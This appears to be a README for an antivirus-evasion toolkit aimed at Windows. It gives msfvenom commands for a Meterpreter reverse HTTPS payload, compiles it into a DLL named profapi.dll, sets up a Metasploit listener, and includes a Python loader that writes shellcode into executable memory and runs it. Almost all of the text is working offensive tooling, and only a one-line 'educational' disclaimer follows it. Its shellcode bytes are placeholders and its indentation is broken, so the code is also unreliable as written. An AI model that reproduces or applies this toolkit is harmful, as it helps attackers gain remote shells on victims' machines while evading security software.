# Window-Av-bypass

# Payload Generation & Configuration
     msfvenom -p windows/meterpreter_reverse_https
     LHOST=your ip  \
     LPORT=443 \
     LURI=/api/v1/data/ \
     HTTPUSERAGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" \
      -f c \
        -a x64 \
       --platform windows

 # complile the shellcode to a  file or a dll 
 
        i686-w64-mingw32-g++ payload.cpp -shared -o profapi.dll -lwininet

 # set this up in msfconsole
     use multi/handler
     set payload windows/x64/meterpreter_reverse_http
    set luri /api/v1/data/
    set lhost 0.0.0.0
    set autoloadstdapi false
    set autosysteminfo false
    set exitonsession false
    run -j

   # python code to obfsucate the shell or the shellcode
      import ctypes
     import threading
     from ctypes import wintypes

     MEM_COMMIT = 0x1000
    PAGE_EXECUTE_READWRITE = 0x40

      buf =  b""
     buf += b"\x4d\x5a\x41\x52\x55\x48\x89\xe5\x48\x83\xec\x20"

    buf += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    buf += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    buf += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     buf += b"\xff\xff\xff\xff"

    #Define functions from kernerl32.dll
    kernel32 = ctypes.windll.kernel32
    kernel32.GetCurrentProcess.restype = wintypes.HANDLE
    kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
    kernel32.VirtualAllocEx.restype = wintypes.LPVOID
    kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
    kernel32.WriteProcessMemory.restype = wintypes.BOOL

    def ThreadFunction(lpParameter):
    current_process = kernel32.GetCurrentProcess()

    # Allocate memory with `VirtualAllocEx`
    sc_memory = kernel32.VirtualAllocEx(current_process, None, len(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    bytes_written = ctypes.c_size_t(0)

    # Copy raw shellcode with `WriteProcessMemory`
    kernel32.WriteProcessMemory(current_process, sc_memory,ctypes.c_char_p(buf),len(buf),ctypes.byref(bytes_written))

    # Execute shellcode in memory by casting the address to a function pointer with `CFUNCTYPE`
    shell_func = ctypes.CFUNCTYPE(None)(sc_memory)
    shell_func()

    return 1

    def Run():
    thread = threading.Thread(target=ThreadFunction, args=(None,))
    thread.start()

    if __name__ == "__main__":
    Run()

  #DISCLAIMER THIS IS ONLY FOR EDUCATIONAL PURPOSE!  
